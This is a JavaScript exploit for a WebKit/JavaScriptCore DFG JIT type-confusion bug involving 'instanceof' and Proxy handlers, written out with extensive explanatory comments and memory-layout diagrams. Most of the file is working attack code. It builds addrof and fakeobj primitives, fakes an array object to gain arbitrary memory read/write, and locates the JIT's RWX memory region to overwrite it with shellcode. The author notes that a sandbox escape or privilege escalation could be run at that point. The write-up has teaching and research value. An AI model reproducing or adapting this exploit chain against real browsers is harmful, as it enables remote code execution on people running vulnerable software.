/*
    We didn't think it would work. Not really.
    We were young, and stupid in the way that only young people can be.
    We felt immortal, drawing pentagrams and playing at being dark sorcerers.
    Until, one day, it worked.
    And brought forth something truly evil.
*/

//
// Resources I found useful in order to write this analysis:
//
// - Attacking JavaScript Engines (saelo) [http://phrack.org/papers/attacking_javascript_engines.html]
// - JavaScript Engine Fundamentals (mathiasbynens) [https://mathiasbynens.be/notes/shapes-ics]
// - Pwn2Own 2018: Safari + macOS (saelo) [https://github.com/saelo/pwn2own2018]
// - Various WebKit exploits (niklasb) [https://github.com/niklasb/sploits/tree/master/safari]
// - Various WebKit exploits (externalist) [https://github.com/externalist/exploit_playground]
//
// Enjoy!
//
// - Alexandro Luongo (@w00dl3cs)

//
// Exploit primitives
//
// CVE-2018-42**
//
// Bug Tracker: 	https://bugs.webkit.org/show_bug.cgi?id=185694
// WebKit Commit: 	https://github.com/WebKit/webkit/commit/b4e567d371fde84474a56810a03bf3d0719aed1e
//
// "DFG models InstanceOf incorrectly"
//
// The DFG JIT does not take into account that, through the use of a Proxy,
// it is possible to run arbitrary javascript during an 'instanceof' operation.
// As DFG does not bail-out, this might possibly lead to a type confusion.
//
var primitives = {
    //
    // addrof: leak the address of an arbitrary JavaScript object
    //
    // Allocate an unboxed array (ArrayWithDouble), then make it boxed (ArrayWithContiguous)
    // by inserting a JSObject through a side-effect call triggered inside a JIT-compiled function.
    // As the optimized routine still thinks the array contains unboxed values, it's
    // possible to retrieve the new inserted item with the engine treating it as double, while
    // instead it's a JSValue (pointer).
    //
    addrof: function(obj) {
        // Allocate an unboxed array (ArrayWithDouble)
        var arg = [1.1, 2.2, 3.3];

        function InfoLeaker(arg, proxy) {
            // Trigger the side-effect, invoking 'proxy.getPrototypeOf()'
            _ = proxy instanceof Object;

            // 'arg[0]' is now a JSValue, but the routine is not aware of it
            return arg[0];
        }

        // Force JIT compilation of the InfoLeaker routine
        for (var i = 0; i < 100000; i++) {
            InfoLeaker(arg, {});
        }

        // Installing an handler on 'getPrototypeOf'
        // allows executing arbitrary code without DFG bailing-out
        var handler = {
            getPrototypeOf: () => {
                // 'arg[0]' will be replaced with a pointer to 'obj'
                arg[0] = obj;
                return {};
            }
        };

        var addr = InfoLeaker(arg, new Proxy({}, handler));

        if (addr !== 1.1 && typeof addr !== 'object')
            return Int64.fromDouble(addr);

        throw "Could not leak address using 'addrof' primitive!";
    },

    //
    // fakeobj: inject arbitrary objects into the JavaScript engine
    //
    // Allocate an unboxed array (ArrayWithDouble), then make it boxed (ArrayWithContiguous)
    // by inserting a JSObject through a side-effect call triggered inside a JIT-compiled function.
    // As the optimized routine still thinks the array contains unboxed values, it's
    // possible to replace the new inserted item with a double, having the engine treat it
    // as a JSValue (pointer) instead.
    //
    fakeobj: function(addr) {
        // Allocate an unboxed array (ArrayWithDouble)
        var arg = [1.1, 2.2, 3.3];

        function ObjFaker(arg, proxy) {
            // Trigger the side-effect, invoking 'proxy.getPrototypeOf()'
            _ = proxy instanceof Object;

            // 'arg' is now ArrayWithContiguous, but the routine is not aware of it
            arg[0] = addr;
        }

        // Force JIT compilation of the ObjFaker routine
        for (var i = 0; i < 100000; i++) {
            ObjFaker(arg, {});
        }

        // Installing an handler on 'getPrototypeOf'
        // allows executing arbitrary code without DFG bailing-out
        var handler = {
            getPrototypeOf: () => {
                // 'arg[0]' will be replaced with a pointer
                arg[0] = {};
                return {};
            }
        };

        ObjFaker(arg, new Proxy({}, handler));

        var obj = arg[0];

        if (typeof obj === "object")
            return obj;

        throw "Could not materialize object using 'fakeobj' primitive!";
    }
};

var structs = [];

function sprayStructures() {
    for (var i = 0; i < 1000; i++) {
        var a = [13.37];
        a['prop'] = 13.37;
        a['prop' + i] = 13.37;
        structs.push(a);
    }
}

function makeJITCompiledFunction() {
    // Some code to avoid inlining...
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }

    return target;
}

function isMacOS(rwxPrologue) {
    //
    // 0x0000000000000000: push rbp
    // 0x0000000000000001: mov rbp, rsp
    //
    var macOSPrologue = [0x55, 0x48, 0x89, 0xe5];

    return (rwxPrologue.length >= macOSPrologue.length && macOSPrologue.every((op, i) => rwxPrologue[i] === op));
}

function pwn() {
    //
    // Spray Array structures so that we'll be able to guess an
    // Array StructureID with very high probability later on.
    //
    //                             +-----------------+
    //                             |   Structure 2   |
    //                    + prop2  |                 |
    //                +------------> prop: 13.37     |
    //                |            | prop2: 13.37    |
    //                |            |                 |
    //                |            +-----------------+
    // +--------------+--+         +-----------------+
    // |   Structure 1   |         |   Structure 3   |
    // |                 | + prop3 |                 |
    // | prop: 13.37     +---------> prop: 13.37     |
    // |                 |         | prop3: 13.37    |
    // +--------------+--+         |                 |
    //                |            +-----------------+
    //                |            +-----------------+
    //                |            |   Structure n   |
    //                |   + propn  |                 |
    //                +------------> prop: 13.37     |
    //                             | propn: 13.37    |
    //                             |                 |
    //                             +-----------------+
    //
    sprayStructures();

    //
    // During structure spraying, we've allocated 1000 JSArrays.
    // Let's use one of them for our arbitrary read/write primitives.
    // Killing two birds with one stone.
    //
    var victim = structs[Math.floor(Math.random() * structs.length)];

    // Faking an Array and injecting it into the engine is the first step to
    // construct arbitrary read/write primitives.
    //
    // In his phrack article, saelo solves the problem by faking a Float64Array and then
    // abusing its 'm_vector' field, so that it can be redirected to another array
    // under the attacker's control.
    // Such exploitation technique, however, is not reliable anymore since the
    // introduction of the Gigacages for TypedArrays (JSArrayBufferView):
    //
    //  +0 { 32} JSArrayBufferView
    //  +0 { 16}     JSC::JSNonFinalObject
    //  +0 { 16}         JSC::JSObject
    //  +0 {  8}             JSC::JSCell
    //  +0 {  1}                 JSC::HeapCell
    //  +0 <  4>                 JSC::StructureID m_structureID;
    //  +4 <  1>                 JSC::IndexingType m_indexingTypeAndMisc;
    //  +5 <  1>                 JSC::JSType m_type;
    //  +6 <  1>                 JSC::TypeInfo::InlineTypeFlags m_flags;
    //  +7 <  1>                 JSC::CellState m_cellState;
    //  +8 <  8>             JSC::AuxiliaryBarrier<JSC::Butterfly *> m_butterfly;
    //  +8 <  8>                 JSC::Butterfly * m_value;
    // +16 <  8>     JSC::CagedBarrierPtr<Gigacage::Primitive, void> m_vector;
    // +16 <  8>         JSC::AuxiliaryBarrier<WTF::CagedPtr<Gigacage::Primitive, void, WTF::DumbPtrTraits<void> > > m_barrier;
    // +16 <  8>     <PADDING>
    // +24 <  4>     uint32_t m_length;
    // +28 <  4>     JSC::TypedArrayMode m_mode;
    //
    // Pointers inside a Gigacage cannot be replaced with anything outside of it.
    // Long story short, 'm_vector' is now caged.
    //
    // Good news is, 'm_butterfly' is not.
    // While TypedArrays store values inside their 'm_vector' field, normal Arrays don't.
    // So faking or redirecting a butterfly is still possible as of now:
    //
    // +0 { 16} JSArray
    // +0 { 16}     JSC::JSNonFinalObject
    // +0 { 16}         JSC::JSObject
    // +0 {  8}             JSC::JSCell
    // +0 {  1}                 JSC::HeapCell
    // +0 <  4>                 JSC::StructureID m_structureID;
    // +4 <  1>                 JSC::IndexingType m_indexingTypeAndMisc;
    // +5 <  1>                 JSC::JSType m_type;
    // +6 <  1>                 JSC::TypeInfo::InlineTypeFlags m_flags;
    // +7 <  1>                 JSC::CellState m_cellState;
    // +8 <  8>             JSC::AuxiliaryBarrier<JSC::Butterfly *> m_butterfly;
    // +8 <  8>                 JSC::Butterfly * m_value;
    //

    //
    // StructureIDs allocated during spraying should range between 360 and 1360.
    // Any number in-between should provide us with a structure id we can use
    // to fake a valid Array. If that's not going to be the case, however,
    // we're gonna attempt to brute-force such identifier.
    // 512 (0x200) seems like a reasonable number to start from.
    //
    var jsDoubleCellHeader = new Int64([
        0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
        0x7,                                   // m_indexingTypeAndMisc (ArrayWithDouble)
        0x20,                                  // m_type (ArrayType)
        0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
        0x1                                    // m_cellState (DefinitelyWhite)
    ]);

    var jsContiguousCellHeader = new Int64([
        0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
        0x9,                                   // m_indexingTypeAndMisc (ArrayWithContiguous)
        0x20,                                  // m_type (ArrayType)
        0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
        0x1                                    // m_cellState (DefinitelyWhite)
    ]);

    //
    // Let's create the object whose properties are going to appear as a real
    // Array to the engine.
    //
    var container = {
        jsCellHeader: jsContiguousCellHeader.asJSValue(),
        butterfly: victim
    };

    //
    // Let's have a look at how 'container' appears in memory.
    //
    // lldb output (with 'container' at 0x1077c45c0):
    //
    // (lldb) x/4gx 0x1077c45c0 -l 1
    // 0x1077c45c0: 0x0100150000000552  +----------+
    // 0x1077c45c8: 0x0000000000000000  +--------+ |
    // 0x1077c45d0: 0x0108200900000200  +------+ | |
    // 0x1077c45d8: 0x00000001077b6bd0  +----+ | | |
    //                                       | | | |
    // +----------------------------------+  | | | |
    // |            container             |  | | | |
    // +----------------------------------+  | | | |
    // | +0 <8> JSC::JSCell               <--------+
    // | +8 <8> JSC::Butterfly            <------+
    // |                                  |  | |
    // | Inline properties:               |  | |
    // |                                  |  | |
    // | +16 <8> jsCellHeader             <----+
    // |    +16 <4> m_structureID         |  |
    // |    +20 <1> m_indexingTypeAndMisc |  |
    // |    +21 <1> m_type                |  |
    // |    +22 <1> m_flags               |  |
    // |    +23 <1> m_cellState           |  |
    // | +24 <8> butterfly                <--+
    // +----------------------------------+
    //

    var containerAddr = primitives.addrof(container);
    print("[+] Container @ " + containerAddr);

    //
    // Pointing a JSValue to the inline properties of the 'container'
    // object, we can inject a valid JSObject inside the JavaScript engine.
    //
    // +----------------------------------+
    // |            container             |
    // +----------------------------------+
    // | +0 <8> JSC::JSCell               |
    // | +8 <8> JSC::Butterfly            |
    // |                                  |
    // | Inline properties:               |
    // |                                  |      +-------------------+
    // | +16 <8> jsCellHeader  <-----------------+ driver (JSObject) |
    // |    +16 <4> m_structureID         |      +-------------------+
    // |    +20 <1> m_indexingTypeAndMisc |
    // |    +21 <1> m_type                |
    // |    +22 <1> m_flags               |
    // |    +23 <1> m_cellState           |
    // | +24 <8> butterfly                |
    // +----------------------------------+
    //

    var fakeArrayAddr = Add(containerAddr, 0x10);
    print("[+] Fake Array @ " + fakeArrayAddr);

    var driver = primitives.fakeobj(fakeArrayAddr.asDouble());

    //
    // From now on, garbage collector would be super unhappy, and would
    // make everything crash in case it got triggered during exploitation.
    //
    // I'm pretty sure this can be avoided by fixing up the 'driver' object
    // so that its cell and its butterfly work in accordance to the details
    // of the Structure that it's trying to fake.
    //
    // Still haven't found the exact reason of the crash, nor a quick way to
    // fix the mess, so I'd really appreciate if someone could point me
    // into the right direction.
    //
    // Anyway...
    //

    //
    // As pointed out before, using 512 as StructureID should be a safe bet
    // to fake an Array object... but better safe, than sorry.
    //
    while (!(driver instanceof Array)) {
        jsDoubleCellHeader.assignAdd(jsDoubleCellHeader, Int64.One);
        jsContiguousCellHeader.assignAdd(jsContiguousCellHeader, Int64.One);

        container.jsCellHeader = jsContiguousCellHeader.asJSValue();
    }

    //
    // In this moment, the engine recognizes 'driver' as an Array.
    // Arrays store values using their butterfly, and 'driver' has its
    // butterfly pointing to 'victim'.
    // In other words, accessing any slot inside 'driver' actually means
    // accessing properties of the 'victim' object.
    //
    // Example: 'driver[1]' gives us control over the real butterfly
    // of the 'victim' object:
    //
    //    properties                                           array slots
    // +---------------+                               +-------------------------+
    // +-------+-------+---------------+---------------+-------+--------+--------+
    // | 13.37 | 13.37 | public length | vector length | 13.37 | slot 1 | slot 2 |
    // +-------+-------+---------------+-----------------------+--------+--------+
    //   propn   prop                                  ^
    //                                                 +-------------------+
    //                                                                     |
    // +----------------------+               +-----------------------+    |
    // |        driver        |               |        victim         |    |
    // +----------------------+               +-----------------------+    |
    // | +0 <8> jsCellHeader  |   driver[1]   | +0 <8> JSC::JSCell    |    |
    // | +8 <8> butterfly     ----------------> +8 <8> JSC::Butterfly -----+
    // +----------------------+               +-----------------------+
    //
    // Note: 'public length' and 'vector length' occupy 4 bytes each.
    //
    // As 'victim' itself is an Array, modifying its butterfly implies changes to its
    // backing store; in other words, considering 'victim' is an ArrayWithDouble,
    // we can use it to write (and read) doubles almost everywhere we want.
    //
    // 'Almost', that's significant: 'victim' reads data from its butterfly, which in
    // turn can only be set by 'driver'; but 'driver' is an ArrayWithContiguos, so it
    // can only insert JSValues in its backing store.
    //
    // This, indirectly, puts a limit to what can be read/written from the 'victim'
    // array: everything works fine as long as we have access to a JSValue pointing
    // to the memory location we're interested in reading/writing... but what if we don't?
    //
    // Also, another limitation is dictated by the fact that 'victim' is an array, thus
    // it relies on the informations of its butterfly in order to access properties
    // which have been put inside its array slots: if the 'vector length' field is invalid,
    // then it won't be possible to fetch (or modify) any element of the array.
    //
    // In other words, as of now we would be able to read/write arbitrary memory only if:
    // 1) We had access to a JSValue pointing to that memory location
    // 2) Such memory location was preceded by a valid 'vector length' field
    //
    // These surely are limitation we need to get rid of.
    //
    // But for the time being, let's make use of what we have so far.
    // We can still use these capabilities to upgrade the 'addrof' and 'fakeobj' primitives,
    // and make them more stable/reliable.
    //
    // For this purpose, the idea is to have two different Arrays (one containing doubles
    // and another containing JSValues) to share the same butterfly, so that properties
    // set from one array could be retrieved with a different type from the other one.
    //

    // ArrayWithContiguous
    var boxed = [{}];

    // ArrayWithDouble
    var unboxed = [13.37, 13.37];

    //
    // We're going to use the unboxed array's butterfly as the shared butterfly between the two arrays.
    // Using an existing butterfly saves us from having to allocate a third array, and then copying its
    // butterfly in two other different locations.
    //
    // Through a layer of indirection, we can use the 'driver' object to replace the butterfly of the
    // 'victim' object, so that it points to the unboxed array.
    //
    // 'driver[1] = unboxed':
    //
    // +----------------------+             +-----------------------+             +-----------------------+
    // |        driver        |             |        victim         |             |        unboxed        |
    // +----------------------+             +-----------------------+  = unboxed  +-----------------------+
    // | +0 <8> jsCellHeader  |  driver[1]  | +0 <8> JSC::JSCell    |      +------> +0 <8> JSC::JSCell    |
    // | +8 <8> butterfly     --------------> +8 <8> JSC::Butterfly -------+      | +8 <8> JSC::Butterfly |
    // +----------------------+             +-----------------------+             +-----------------------+
    //
    // Similarly to what happened in the previous step, at this point accessing any slot in the 'victim'
    // object means having access to any property of the unboxed array.
    // In this way, it's possible to leak the memory address its butterfly is located at.
    //

    driver[1] = unboxed;

    var shared_butterfly = Int64.fromDouble(victim[1]);
    print("[+] Shared butterfly @ " + shared_butterfly);

    //
    // Address of the unboxed butterfly has been leaked, so it's time to modify
    // the one of the boxed array accordingly.
    //

    driver[1] = boxed;

    victim[1] = shared_butterfly.asDouble();

    //
    // Pointing 'driver[1]' to the boxed array means replacing the butterfly of the 'victim' object.
    // This probably needs to be reverted aswell, if we don't want the garbage collector to kill us.
    //

    //
    // Setup process is pretty much completed, and arbitrary read/write primitives are
    // right around the corner!
    //
    // The boxed and the unboxed arrays now point to the same backing store, which,
    // in other words, means controlled type confusion: every element added to one
    // of the two arrays can be fetched from the other array with a different type.
    //
    // We're gonna upgrade our 'addrof' and 'fakeobj' primitives making use of
    // these changes:
    //                                          array slots
    //                                 +--------------------------+
    // +---------------+---------------+--------+--------+--------+
    // | public length | vector length | slot 0 | slot 1 | slot 2 |
    // +---------------+------------------------+--------+--------+
    //                                 ^
    // +-----------------------+       |       +-----------------------+
    // |        boxed          |       |       |        unboxed        |
    // +-----------------------+       |       +-----------------------+
    // | +0 <8> JSC::JSCell    |       |       | +0 <8> JSC::JSCell    |
    // | +8 <8> JSC::Butterfly --------^-------- +8 <8> JSC::Butterfly |
    // +-----------------------+               +-----------------------+
    //      ^             |                         |             ^
    //  [1] |         [2] |                     [1] |         [2] |
    //      |             v                         v             |
    // +---------+   +---------+               +---------+   +---------+
    // | insert  |   |  fake   |               |  leak   |   | insert  |
    // | JSValue |   | JSValue |               | address |   | address |
    // +---------+   +---------+               +---------+   +---------+
    //
    // [1] - 'addrof' primitive:
    // Insert an object into the boxed array, so that the butterfly gets
    // populated with a pointer (JSValue) to that object; finally, retrieve
    // it from the unboxed array as double, effectively leaking its address.
    //
    // [2] - 'fakeobj' primitive:
    // Insert an address into the unboxed array, so that the butterfly gets
    // populated with a double representing a memory location; finally,
    // retrieve it from the boxed array as a JSValue effectively pointing to
    // that location.
    //

    //
    // Finally, it's time to get rid of the limitations on our
    // arbitrary read/write primitives.
    //
    // As 'driver' is an ArrayWithContiguous and can only work with JSValues,
    // changing it to ArrayWithDouble would really allow us to point to
    // arbitrary memory locations.
    //
    // Note:
    // Yes, we're changing a property on the 'container' object to swap the type
    // of the 'driver' object, so that it can be used to modify the backing store
    // of the 'victim' array, which, in turn, can be used to read or write
    // arbitrary data to arbitrary memory locations. Seems reasonable.
    //

    container.jsCellHeader = jsDoubleCellHeader.asJSValue();

    //
    // Time to upgrade exploit primitives!
    //
    primitives = {
        addrof: function(obj) {
            boxed[0] = obj;
            return Int64.fromDouble(unboxed[0]);
        },

        fakeobj: function(addr) {
            unboxed[0] = addr.asDouble();
            return boxed[0];
        },

        //
        // Arbitrary read/write primitives work in a slightly different way.
        //
        // 'driver' allows now to override the butterfly of the 'victim' array,
        // pointing it to any memory location: no more limitations on addresses
        // pointed by JSValues.
        //
        // But what about the other limitation, the one related to the length of
        // the array? Unfortunately, if the address does not point to a memory
        // location preceded by a valid 'vector length' field, it would still be
        // impossible to read or modify the content of the array slots.
        //
        // Property slots, on the other hand, are a different story:
        //
        //        property slots                        array slots
        // +--------------------------+        +--------------------------+
        // +--------------------------------------------------------------+
        // | slot 2 | slot 1 | slot 0 | length | slot 0 | slot 1 | slot 2 |
        // +--------+--------+--------+-----------------+--------+--------+
        //                                     ^
        //                                     +-------------------------------+
        //                                                                     |
        // +----------------------+               +-----------------------+    |
        // |        driver        |               |        victim         |    |
        // +----------------------+               +-----------------------+    |
        // | +0 <8> jsCellHeader  |   driver[1]   | +0 <8> JSC::JSCell    |    |
        // | +8 <8> butterfly     ----------------> +8 <8> JSC::Butterfly -----+
        // +----------------------+               +-----------------------+
        //
        // Note: 'public length' and 'vector length' have been squashed in a single
        // 64-bit field, 'length'.
        //
        // The idea is to replace the 'victim' array butterfly so that the arbitrary
        // memory location is not going to be placed inside the first array slot, but
        // rather in the first property slot.
        //
        // This can be easily achieved by sliding the address of interest by 16 bytes,
        // and point the 'victim' butterfly to that location: in this way, the real
        // address we're interested in overlaps with the first property slot of the array:
        //
        //        property slots                       array slots
        // +--------------------------+        +--------------------------+
        // +--------------------------------------------------------------+
        // | slot 2 | slot 1 | slot 0 | length | slot 0 | slot 1 | slot 2 |   normal butterfly
        // +--------+--------+--------+--------+--------+--------+--------+
        // +--------+--------+--------+--------+---------+--------+--------+
        // | slot 2 | slot 1 |  addr  | addr+8 | addr+16 | slot 1 | slot 2 |  overlapped butterfly
        // +--------+--------+--------+------------------+--------+--------+
        //                                     ^
        //                                     +-------------------------------+
        //                                                                     |
        // +----------------------+               +-----------------------+    |
        // |        driver        |               |        victim         |    |
        // +----------------------+               +-----------------------+    |
        // | +0 <8> jsCellHeader  |   driver[1]   | +0 <8> JSC::JSCell    |    |
        // | +8 <8> butterfly     ----------------> +8 <8> JSC::Butterfly -----+
        // +----------------------+               +-----------------------+
        //
        // At this point, reading or writing to arbitrary memory locations becomes
        // just a matter of accessing that particular property slot on the 'victim'
        // array.
        //
        // In this regard, whe know that 'victim' is one of the 1000 arrays which
        // have been sprayed in the very early stages of the exploit; each of these
        // arrays has its own StructureID (so they have different properties), but all
        // of them share the common 'prop' property, which is going to act as our entry
        // point for arbitrary read/write primitives!
        //
        write64: function(addr, what) {
            driver[1] = Add(addr, 0x10).asDouble();
            victim.prop = this.fakeobj(what);
        },

        read64: function(addr) {
            driver[1] = Add(addr, 0x10).asDouble();
            return this.addrof(victim.prop);
        }
    };

    print("[+] Got arbitrary memory read/write!");

    //
    // Upgraded exploit primitives finally allow arbitrary memory read/write.
    // We're going to use them in order to leak the address of a RWX memory
    // region, and later patch it with shellcode.
    //
    // Creating the RWX memory region is prerogative of the JIT compiler, so
    // we're gonna instruct it to do so.
    //

    var shellcodeFunc = makeJITCompiledFunction();

    //
    // Now that the JIT has successfully compiled the target function, it's
    // just a matter of traverse its data structure in order to access the
    // informations about the RWX memory region it points to.
    //
    // First of all, 'shellcodeFunc' is a JSFunction:
    //
    //  +0 { 40} JSFunction
    //  +0 { 24}     JSC::JSCallee
    //  +0 { 16}         JSC::JSNonFinalObject
    //  +0 { 16}             JSC::JSObject
    //  +0 {  8}                 JSC::JSCell
    //  +0 {  1}                     JSC::HeapCell
    //  +0 <  4>                     JSC::StructureID m_structureID;
    //  +4 <  1>                     JSC::IndexingType m_indexingTypeAndMisc;
    //  +5 <  1>                     JSC::JSType m_type;
    //  +6 <  1>                     JSC::TypeInfo::InlineTypeFlags m_flags;
    //  +7 <  1>                     JSC::CellState m_cellState;
    //  +8 <  8>                 JSC::AuxiliaryBarrier<JSC::Butterfly *> m_butterfly;
    //  +8 <  8>                     JSC::Butterfly * m_value;
    // +16 <  8>         JSC::WriteBarrier<JSC::JSScope, WTF::DumbPtrTraits<JSC::JSScope> > m_scope;
    // +16 {  8}             JSC::WriteBarrierBase<JSC::JSScope, WTF::DumbPtrTraits<JSC::JSScope> >
    // +16 <  8>                 JSC::WriteBarrierBase<JSC::JSScope, WTF::DumbPtrTraits<JSC::JSScope> >::StorageType m_cell;
    // +24 <  8>     JSC::WriteBarrier<JSC::ExecutableBase, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::ExecutableBase> > m_executable;
    // +24 {  8}         JSC::WriteBarrierBase<JSC::ExecutableBase, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::ExecutableBase> >
    // +24 <  8>     <PADDING>
    // +32 <  8>     JSC::WriteBarrier<JSC::FunctionRareData, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::FunctionRareData> > m_rareData;
    // +32 {  8}         JSC::WriteBarrierBase<JSC::FunctionRareData, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::FunctionRareData> >
    // +32 <  8>     <PADDING>
    //

    var shellcodeFuncAddr = primitives.addrof(shellcodeFunc);
    print("[+] Shellcode function @ " + shellcodeFuncAddr);

    //
    // The field 'm_executable' (offset 24) seems like a reasonable path to inspect.
    //

    var executableAddr = primitives.read64(Add(shellcodeFuncAddr, 24));
    print("[+] Executable instance @ " + executableAddr);

    //
    // 'executableAddr' now points to an ExecutableBase:
    //
    //  +0 { 56} ExecutableBase
    //  +0 {  8}     JSC::JSCell
    //  +0 {  1}         JSC::HeapCell
    //  +0 <  4>         JSC::StructureID m_structureID;
    //  +4 <  1>         JSC::IndexingType m_indexingTypeAndMisc;
    //  +5 <  1>         JSC::JSType m_type;
    //  +6 <  1>         JSC::TypeInfo::InlineTypeFlags m_flags;
    //  +7 <  1>         JSC::CellState m_cellState;
    //  +8 <  4>     int m_numParametersForCall;
    // +12 <  4>     int m_numParametersForConstruct;
    // +16 <  4>     JSC::Intrinsic m_intrinsic;
    // +20 <  4>     <PADDING>
    // +24 <  8>     WTF::RefPtr<JSC::JITCode, WTF::DumbPtrTraits<JSC::JITCode> > m_jitCodeForCall;
    // +24 <  8>         WTF::DumbPtrTraits<JSC::JITCode>::StorageType m_ptr;
    // +32 <  8>     WTF::RefPtr<JSC::JITCode, WTF::DumbPtrTraits<JSC::JITCode> > m_jitCodeForConstruct;
    // +32 <  8>     <PADDING>
    // +40 <  8>     JSC::MacroAssemblerCodePtr<357> m_jitCodeForCallWithArityCheck;
    // +40 {  1}         JSC::MacroAssemblerCodePtrBase
    // +40 <  8>         WTF::Poisoned<WTF::Poison<uintptr_t &>, void *> m_value;
    // +40 <  8>             WTF::PoisonedBits m_poisonedBits;
    // +48 <  8>     JSC::MacroAssemblerCodePtr<357> m_jitCodeForConstructWithArityCheck;
    // +48 <  8>     <PADDING>
    //

    //
    // As our interest revolves around the memory area containing the compiled function,
    // the field 'm_jitCodeForCall' (offset 24) seems like the way to go.
    //

    var jitCodeAddr = primitives.read64(Add(executableAddr, 24));
    print("[+] JITCode instance @ " + jitCodeAddr);

    //
    // And this is the JITCode which is being pointed by 'jitCodeAddr':
    //
    //   +0 {536} JITCode
    //   +0 { 40}     JSC::DirectJITCode
    //   +0 { 32}         JSC::JITCodeWithCodeRef
    //   +0 { 16}             JSC::JITCode
    //   +0 <  8>                 __vtbl_ptr_type * _vptr;
    //   +8 {  4}                 WTF::ThreadSafeRefCounted<JSC::JITCode, WTF::DestructionThread::Any>
    //   +8 {  4}                     WTF::ThreadSafeRefCountedBase
    //   +8 <  4>                         std::__1::atomic<unsigned int> m_refCount;
    //   +8 {  4}                             std::__1::__atomic_base<unsigned int, true>
    //   +8 {  4}                                 std::__1::__atomic_base<unsigned int, false>
    //   +8 <  4>                                     unsigned int __a_;
    //  +12 <  1>                 JSC::JITCode::JITType m_jitType;
    //  +13 <  3>                 <PADDING>
    //  +13 <  3>             <PADDING>
    //  +16 < 16>             JSC::MacroAssemblerCodeRef<357> m_ref;
    //  +16 {  1}                 JSC::MacroAssemblerCodeRefBase
    //  +16 <  8>                 JSC::MacroAssemblerCodePtr<357> m_codePtr;
    //  +16 {  1}                     JSC::MacroAssemblerCodePtrBase
    //  +16 <  8>                     WTF::Poisoned<WTF::Poison<uintptr_t &>, void *> m_value;
    //  +16 <  8>                         WTF::PoisonedBits m_poisonedBits;
    //  +24 <  8>                 WTF::RefPtr<WTF::MetaAllocatorHandle, WTF::DumbPtrTraits<WTF::MetaAllocatorHandle> > m_executableMemory;
    //  +24 <  8>                     WTF::DumbPtrTraits<WTF::MetaAllocatorHandle>::StorageType m_ptr;
    //  +32 <  8>         JSC::MacroAssemblerCodePtr<357> m_withArityCheck;
    //  +32 <  8>         <PADDING>
    //  +32 <  8>     <PADDING>
    //  ...
    //

    //
    // Finally, 'm_withArityCheck' (offset 32) is the field which points inside the RWX region.
    //
    // lldb output (with 'm_withArityCheck' pointing at 0x00005eb7bfc0ece4):
    //
    // (lldb) memory region 0x00005eb7bfc0ece4
    // [0x00005eb7bfc01000-0x00005eb7ffc01000) rwx
    //

    var rwxMemAddr = primitives.read64(Add(jitCodeAddr, 32));
    print("[+] RWX memory @ " + rwxMemAddr);

    //
    // Ensure we're running on macOS by analysing the prologue
    // of the JIT function.
    //
    if (!isMacOS(primitives.read64(rwxMemAddr).bytes()))
        throw "iOS is not supported (yet?)";

    //
    // Only thing left to do, is to replace the current RWX memory region with shellcode,
    // and then invoke 'shellcodeFunc'.
    //
    // I'm just going to make the process crash; if you have something cool to run (like
    // a sanbox-escape, and LPE etc), well... you're supposed to run it here.
    //
    for (var i = 0; i < 10; i++)
        primitives.write64(Add(rwxMemAddr, i * 8), new Int64(0xbadbeef));

    print("[!] Jumping into shellcode...");

    var res = shellcodeFunc();

    if (res === 0)
        print("[+] Shellcode executed sucessfully!");
    else
        print("[-] Shellcode failed to execute: error " + res);
}

ready.then(function() {
    try {
        pwn();
    } catch (e) {
        print("[-] Exception caught: " + e);
    }
}).catch(function(err) {
    print("[-] Initialization failed");
});